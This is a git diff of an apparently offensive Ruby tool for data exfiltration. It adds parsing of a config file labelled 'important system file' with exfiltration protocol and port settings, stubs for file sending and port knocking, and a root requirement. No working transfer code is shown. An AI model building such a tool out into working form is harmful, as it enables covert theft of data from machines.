@@ -35,9 +35,9 @@ $KEY = OpenSSL::Digest::SHA256.new("verysecretkey").digest
 ## Application Strings
 CONFIG_FILE = "not_important"
 CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
-CONFIG_FILE_DEFAULT << "\#\n"
-CONFIG_FILE_DEFAULT << "\#\n"
-CONFIG_FILE_DEFAULT << "\#\n"
+CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
+CONFIG_FILE_DEFAULT << "\# exfil_port = 6868\n"
+CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
 CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
 CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
 CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
@@ -64,12 +64,65 @@ def create_default_config
 end
 
 def validate_config
-  #Check if edited
-  #Check if blank
-  #parse lines
+  file = ""
+  File.open(CONFIG_FILE, "r") { |f| file = f.readlines }
+  file.each do |l|
+    l.strip!
+    if l[0] == '#' #line is comment
+      next
+    elsif l.include? '='
+      pair = l.split('=')
+      begin
+        pair[0].strip!
+        pair[1].strip!
+      rescue #if strip fails, pair is blank, bad config
+        exit_reason(CONFIG_INVALID)
+      end
 
-  @cfg_iface = "wlp2s0"
-  @cfg_protocol = "tcp"
+      case pair[0]
+      when "exfil_prot"
+        if valid_protocol(pair[1])
+          @cfg_protocol = pair[1]
+        end
+      when "exfil_port"
+        if valid_port(pair[1].to_i)
+          @cfg_port = pair[1].to_i
+        end
+      when "interface"
+        #interface validation?
+        @cfg_iface = pair[1]
+      end
+    end
+  end
+  if @cfg_port == nil
+    exit_reason(CONFIG_INVALID)
+  end
+end
+
+def valid_protocol(protocol)
+  protocol.downcase!
+  case protocol
+  when "tcp"
+    return true
+  when "udp"
+    return true
+  else
+    return false
+  end
+end
+
+# Checks port range validity (1-65535)
+#
+# @param [Integer] num
+# - port to check
+# @return [bool]
+# - true if valid, false if not
+def valid_port(num)
+    if num >= 1 && num <= 65535
+      return true
+    else
+      return false
+    end
 end
 
 def start_listen_server
@@ -141,6 +194,9 @@ def send_file(file, destination)
   
 end
 
+def generate_knock_seq
+  
+end
 
 ## Main
 
@@ -148,10 +204,10 @@ end
 raise 'Must run as root' unless Process.uid == 0
 load_config_file
 begin
-  listen_thread = Thread.new { start_listen_server }
-  listen_thread.join
+  #listen_thread = Thread.new { start_listen_server }
+  #listen_thread.join
 
 rescue Interrupt # Catch the interrupt(ctrl c) and kill the thread
-  Thread.kill(listen_thread)
+  #Thread.kill(listen_thread)
   exit 0
 end
